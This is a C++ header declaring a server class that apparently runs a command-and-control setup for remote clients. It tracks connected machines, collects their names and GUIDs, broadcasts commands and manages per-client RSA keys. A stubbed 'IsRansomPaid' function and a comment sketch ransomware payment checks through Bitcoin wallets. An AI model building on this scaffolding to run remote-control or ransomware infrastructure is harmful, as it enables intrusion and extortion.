#pragma once

#include "net_common.h"
#include "client.h"
#include "External/base64.h"
#include "External/json.hpp"

#include <thread>
#include <mutex>
#include <iostream>
#include <openssl/bio.h>

#define MAX_CON 300 // max clients on a server

const std::string STATE_SAVE_PATH = "C:\\Users\\ethan\\source\\repos\\DLL\\DLL\\";
const std::string STATE_FILE_NAME = "server_state.json";

using JSON = nlohmann::json;

class ServerInterface
{
public:
	ServerInterface() = default;

	ServerInterface(int UDPPort, int TCPPort);
	~ServerInterface();

	BOOL		      StartServer(Server& server);
	void			  ShutdownServer(BOOL confirm);
	Server            NewServerInstance(SocketTypes serverType, int port);
	BOOL              TCPSendMessageToClient(long cuid, ServerCommand& req);
	BOOL              TCPSendMessageToAllClients(ServerCommand& req);
	BOOL		      SendTCPClientRSAPublicKey(long cuid, BIO* pubKey);
	BOOL			  SaveServerState(); // save the server state in a json file
	JSON			  ReadServerStateFile(); // parse server state file as json
	Client*			  GetClientSaveFile(long cuid); // get properties of a client from the server save file
	BOOL		      IsClientInSaveFile(std::string machineGUID);

	/*
		A thread that receives clientRequests from each client that connects.

		If the ExpectingResponse boolean is set to true, this means a
		server function is waiting for a response from this client.
		Cast to ClientResponse instead of a ClientRequest, otherwise
		all received data is automatically interpreted as a ClientRequest.
	*/
	void              TCPReceiveMessagesFromClient(long cuid);
	void		      AcceptTCPConnections();

	/*
		Wait for a single client response from a client

		Set the ExpectingResponse flag in the Client struct to true
		telling TCPReceiveMessagesFromClient we want to cast the next
		received response to a ClientResponse. Then revert ExpectingResponse
	*/
	ClientResponse    WaitForClientResponse(long cuid);
	
	BOOL              UDPSendMessageToClient(Client clientInfo, UDPMessage& message);
	BOOL			  GetClientComputerName(long cuid);
	BOOL			  GetClientMachineGUID(long cuid);
	void              ListenForUDPMessages();
	BOOL              AddToClientList(Client client);
	ClientResponse    PingClient(long cuid);
	BOOL              ClientIsInClientList(long cuid);
	Client*           GetClientPtr(long cuid);
	std::unordered_map<long, Client>& GetClientList();
	inline BOOL       IsServerRunning(const Server& s) const { return s.alive; }
	inline Server     GetTCPServer() const { return this->m_TCPServerDetails; }
	inline Server     GetUDPServer() const { return this->m_UDPServerDetails; }

protected:
	/*
		Not actually adding a ransomware, especially since this
		code is open-source. Though, I would approach this by using
		some sort of BTC wallet api and assigning every client a unique
		wallet address or message to send, check if that is in the wallet transaction history.

		May be implemented someday...
	*/
	inline BOOL       IsRansomPaid(Client client) { return TRUE; } // return true always. 
				      
	RSAKeys		      GenerateRSAPair();
	BOOL			  PerformRequest(ClientRequest req, Server on, long cuid = -1, sockaddr_in incoming = NetCommon::_default);

	/*
		Wrapper for ReceiveData.
		Receive from a specific client and decrypt
		using the rsa key
	*/
	template <typename _Struct>
	_Struct ReceiveDataFrom(SOCKET s, BOOL encrypted = FALSE, BIO* rsaKey = {});

private:
	/*
		A dictionary with the clientId that contains
		Information about the connected client alongside its private and public
		uniquely generated rsa key for all connected clients
	*/
	std::unordered_map<long, Client> m_ClientList;
	std::mutex    m_ClientListMutex; // concurrency
	Server        m_TCPServerDetails;
	Server        m_UDPServerDetails;
};